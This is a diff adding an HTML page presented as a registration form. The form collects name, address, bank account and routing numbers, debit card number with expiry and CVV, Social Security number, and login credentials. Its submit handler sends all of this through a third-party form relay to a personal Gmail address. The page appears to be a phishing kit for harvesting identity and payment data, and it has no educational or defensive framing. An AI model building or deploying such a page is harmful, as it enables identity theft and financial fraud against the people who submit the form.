@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Comprehensive Registration Form</title>
+    <!-- Tailwind CSS for styling, focusing on curved (rounded) aesthetics -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Google Fonts: Inter for a clean, modern look -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #f3f4f6; /* Light gray background */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+        }
+        
+        /* Custom styles to enhance the 'curved' feel if needed beyond Tailwind */
+        .curved-input {
+            border-radius: 9999px; /* Fully rounded (pill shape) like a curved bracket */
+            padding-left: 1.25rem;
+            padding-right: 1.25rem;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="w-full max-w-2xl bg-white p-8 md:p-12 shadow-xl rounded-[2rem] border border-gray-100">
+        
+        <div class="text-center mb-8">
+            <h2 class="text-3xl font-bold text-gray-800 mb-2">Registration Details</h2>
+            <p class="text-gray-500 text-sm">Please fill out all the required information below.</p>
+        </div>
+
+        <form id="registrationForm" onsubmit="handleSubmit(event)" class="space-y-6">
+
+            <div class="bg-blue-50 p-6 rounded-[1.5rem] space-y-4">
+                <h3 class="text-lg font-semibold text-blue-800 border-b border-blue-200 pb-2 mb-4">Personal Information</h3>
+                
+                <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                    <div>
+                        <label for="fullName" class="block text-sm font-medium text-gray-700 mb-1 pl-3">Full Name *</label>
+                        <input type="text" id="fullName" name="fullName" required placeholder="John Doe"
+                            class="w-full border-gray-300 bg-white border text-gray-900 text-sm focus:ring-blue-500 focus:border-blue-500 block p-3 curved-input shadow-sm transition duration-200">
+                    </div>
+
+                    <div>
+                        <label for="mobileNo" class="block text-sm font-medium text-gray-700 mb-1 pl-3">Mobile No *</label>
+                        <input type="tel" id="mobileNo" name="mobileNo" required placeholder="(123) 456-7890"
+                            class="w-full border-gray-300 bg-white border text-gray-900 text-sm focus:ring-blue-500 focus:border-blue-500 block p-3 curved-input shadow-sm transition duration-200">
+                    </div>
+                </div>
+            </div>
+
+            <div class="bg-green-50 p-6 rounded-[1.5rem] space-y-4">
+                <h3 class="text-lg font-semibold text-green-800 border-b border-green-200 pb-2 mb-4">Address Details</h3>
+                
+                <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                    <div>
+                        <label for="streetAddress" class="block text-sm font-medium text-gray-700 mb-1 pl-3">Street Address *</label>
+                        <input type="text" id="streetAddress" name="streetAddress" required placeholder="123 Main St"
+                            class="w-full border-gray-300 bg-white border text-gray-900 text-sm focus:ring-green-500 focus:border-green-500 block p-3 curved-input shadow-sm transition duration-200">
+                    </div>
+
+                    <div>
+                        <label for="city" class="block text-sm font-medium text-gray-700 mb-1 pl-3">City *</label>
+                        <input type="text" id="city" name="city" required placeholder="New York"
+                            class="w-full border-gray-300 bg-white border text-gray-900 text-sm focus:ring-green-500 focus:border-green-500 block p-3 curved-input shadow-sm transition duration-200">
+                    </div>
+
+                    <div>
+                        <label for="state" class="block text-sm font-medium text-gray-700 mb-1 pl-3">State *</label>
+                        <input type="text" id="state" name="state" required placeholder="NY"
+                            class="w-full border-gray-300 bg-white border text-gray-900 text-sm focus:ring-green-500 focus:border-green-500 block p-3 curved-input shadow-sm transition duration-200">
+                    </div>
+
+                    <div>
+                        <label for="zipCode" class="block text-sm font-medium text-gray-700 mb-1 pl-3">Zip Code *</label>
+                        <input type="text" id="zipCode" name="zipCode" required placeholder="10001"
+                            class="w-full border-gray-300 bg-white border text-gray-900 text-sm focus:ring-green-500 focus:border-green-500 block p-3 curved-input shadow-sm transition duration-200">
+                    </div>
+                </div>
+            </div>
+
+            <div class="bg-purple-50 p-6 rounded-[1.5rem] space-y-4">
+                <h3 class="text-lg font-semibold text-purple-800 border-b border-purple-200 pb-2 mb-4">Banking Information</h3>
+                
+                <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                    <div>
+                        <label for="bankName" class="block text-sm font-medium text-gray-700 mb-1 pl-3">Bank Name *</label>
+                        <input type="text" id="bankName" name="bankName" required placeholder="Example Bank"
+                            class="w-full border-gray-300 bg-white border text-gray-900 text-sm focus:ring-purple-500 focus:border-purple-500 block p-3 curved-input shadow-sm transition duration-200">
+                    </div>
+
+                    <div>
+                        <label for="accountNo" class="block text-sm font-medium text-gray-700 mb-1 pl-3">Account No *</label>
+                        <input type="password" id="accountNo" name="accountNo" required placeholder="••••••••••"
+                            class="w-full border-gray-300 bg-white border text-gray-900 text-sm focus:ring-purple-500 focus:border-purple-500 block p-3 curved-input shadow-sm transition duration-200">
+                    </div>
+
+                    <div>
+                        <label for="routingNo" class="block text-sm font-medium text-gray-700 mb-1 pl-3">Routine No *</label>
+                        <input type="text" id="routingNo" name="routingNo" required placeholder="123456789"
+                            class="w-full border-gray-300 bg-white border text-gray-900 text-sm focus:ring-purple-500 focus:border-purple-500 block p-3 curved-input shadow-sm transition duration-200">
+                    </div>
+                    
+                    <div>
+                        <label for="debitCardNo" class="block text-sm font-medium text-gray-700 mb-1 pl-3">Debit Card No *</label>
+                        <input type="text" id="debitCardNo" name="debitCardNo" required placeholder="xxxx-xxxx-xxxx-1234"
+                            class="w-full border-gray-300 bg-white border text-gray-900 text-sm focus:ring-purple-500 focus:border-purple-500 block p-3 curved-input shadow-sm transition duration-200">
+                    </div>
+
+                    <div>
+                        <label for="expiry" class="block text-sm font-medium text-gray-700 mb-1 pl-3">Expiry *</label>
+                        <input type="text" id="expiry" name="expiry" required placeholder="MM/YY"
+                            class="w-full border-gray-300 bg-white border text-gray-900 text-sm focus:ring-purple-500 focus:border-purple-500 block p-3 curved-input shadow-sm transition duration-200">
+                    </div>
+
+                    <div>
+                        <label for="cvv" class="block text-sm font-medium text-gray-700 mb-1 pl-3">CVV *</label>
+                        <input type="password" id="cvv" name="cvv" required placeholder="•••" maxlength="4"
+                            class="w-full border-gray-300 bg-white border text-gray-900 text-sm focus:ring-purple-500 focus:border-purple-500 block p-3 curved-input shadow-sm transition duration-200">
+                    </div>
+                </div>
+            </div>
+
+            <div class="bg-orange-50 p-6 rounded-[1.5rem] space-y-4">
+                <h3 class="text-lg font-semibold text-orange-800 border-b border-orange-200 pb-2 mb-4">Identity & Security</h3>
+                
+                <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                    <div class="md:col-span-2">
+                        <label for="ssn" class="block text-sm font-medium text-gray-700 mb-1 pl-3">Social Security No *</label>
+                        <input type="password" id="ssn" name="ssn" required placeholder="•••-••-••••"
+                            class="w-full border-gray-300 bg-white border text-gray-900 text-sm focus:ring-orange-500 focus:border-orange-500 block p-3 curved-input shadow-sm transition duration-200">
+                    </div>
+                    
+                    <div>
+                        <label for="userId" class="block text-sm font-medium text-gray-700 mb-1 pl-3">User ID *</label>
+                        <input type="text" id="userId" name="userId" required placeholder="johndoe99"
+                            class="w-full border-gray-300 bg-white border text-gray-900 text-sm focus:ring-orange-500 focus:border-orange-500 block p-3 curved-input shadow-sm transition duration-200">
+                    </div>
+
+                    <div>
+                        <label for="password" class="block text-sm font-medium text-gray-700 mb-1 pl-3">Password *</label>
+                        <input type="password" id="password" name="password" required placeholder="••••••••"
+                            class="w-full border-gray-300 bg-white border text-gray-900 text-sm focus:ring-orange-500 focus:border-orange-500 block p-3 curved-input shadow-sm transition duration-200">
+                    </div>
+                </div>
+            </div>
+
+            <!-- Submit Area -->
+            <div class="pt-4 flex justify-center">
+                <button type="submit" id="submitBtn"
+                    class="text-white bg-gray-900 hover:bg-gray-800 focus:ring-4 focus:outline-none focus:ring-gray-300 font-medium text-lg w-full sm:w-auto px-10 py-4 text-center rounded-full shadow-lg transition duration-300 transform hover:scale-105 active:scale-95">
+                    Submit Registration
+                </button>
+            </div>
+            
+            <!-- Success Message Container -->
+            <div id="successMessage" class="hidden mt-4 p-4 mb-4 text-sm text-green-800 rounded-full bg-green-50 text-center font-medium" role="alert">
+                Form submitted successfully! Check your email.
+            </div>
+            
+            <!-- Error Message Container -->
+            <div id="errorMessage" class="hidden mt-4 p-4 mb-4 text-sm text-red-800 rounded-full bg-red-50 text-center font-medium" role="alert">
+                There was an error sending the form. Please try again.
+            </div>
+
+        </form>
+    </div>
+
+    <script>
+        function handleSubmit(event) {
+            // Prevent the default page refresh
+            event.preventDefault();
+            
+            const form = event.target;
+            const submitBtn = document.getElementById('submitBtn');
+            const successDiv = document.getElementById('successMessage');
+            const errorDiv = document.getElementById('errorMessage');
+            
+            // Hide any previous messages
+            successDiv.classList.add('hidden');
+            errorDiv.classList.add('hidden');
+            
+            // Collect form data
+            const formData = new FormData(form);
+            
+            // Visual feedback: change button text and disable it
+            const originalBtnText = submitBtn.innerText;
+            submitBtn.innerText = 'Sending...';
+            submitBtn.disabled = true;
+            submitBtn.classList.add('opacity-75', 'cursor-not-allowed');
+
+            // Send data to Formsubmit.co via AJAX
+            fetch('https://formsubmit.co/ajax/Johnbennett3110@gmail.com', {
+                method: 'POST',
+                body: formData,
+                headers: {
+                    'Accept': 'application/json'
+                }
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    // Show success message
+                    successDiv.innerText = "Registration details sent successfully! (Note: If this is the first submission, please check Johnbennett3110@gmail.com to activate FormSubmit).";
+                    successDiv.classList.remove('hidden');
+                    form.reset(); // Clear the form
+                } else {
+                    throw new Error('Form submission failed');
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                // Show error message
+                errorDiv.classList.remove('hidden');
+            })
+            .finally(() => {
+                // Restore button state
+                submitBtn.innerText = originalBtnText;
+                submitBtn.disabled = false;
+                submitBtn.classList.remove('opacity-75', 'cursor-not-allowed');
+                
+                // Hide messages after 8 seconds
+                setTimeout(() => {
+                    successDiv.classList.add('hidden');
+                    errorDiv.classList.add('hidden');
+                }, 8000);
+            });
+        }
+    </script>
+</body>
+</html>
